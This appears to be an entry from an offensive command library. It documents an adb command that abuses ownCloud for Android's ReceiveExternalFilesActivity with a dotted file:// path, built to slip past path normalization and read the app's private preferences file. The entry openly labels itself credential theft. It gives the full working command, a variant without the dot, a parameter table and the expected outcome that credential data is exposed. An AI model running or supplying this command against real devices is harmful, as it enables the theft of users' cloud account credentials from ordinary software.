---
data: >-
  adb shell am start -n
  com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain"
  --grant-read-uri-permission -a "android.intent.action.SEND" --eu
  "android.intent.extra.STREAM"
  "file:///data/data/./com.owncloud.android/shared_prefs/com.owncloud.android_preferences.xml"
tags:
  - adb
  - android
  - credential-theft
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:45.263Z'
id: 98554a69-3229-4505-a712-0ec5d78e94b5
verified: false
validated: true
submitted: true
---
# ADB Send Intent to Preferences XML

## Command

```bash
adb shell am start -n com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/data/./com.owncloud.android/shared_prefs/com.owncloud.android_preferences.xml"
```

## Description

This command sends an intent to access the ownCloud preferences XML file using a dotted path to bypass normalization, stealing account credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component specifier | Yes |
| -t "text/plain" | MIME type | Yes |
| --grant-read-uri-permission | URI read grant | Yes |
| -a "android.intent.action.SEND" | Action | Yes |
| --eu "android.intent.extra.STREAM" | URI with dot for bypass | Yes |

## Examples

### Basic Usage

```bash
# As above
```

### Advanced Usage

```bash
# Without dot if direct path works
adb shell am start ... "file:///data/data/com.owncloud.android/shared_prefs/com.owncloud.android_preferences.xml"
```

## Expected Output

The activity reads the preferences file, exposing credential data.

## Related

- [[Related Procedure: Send Intent to Steal Sensitive Data]]
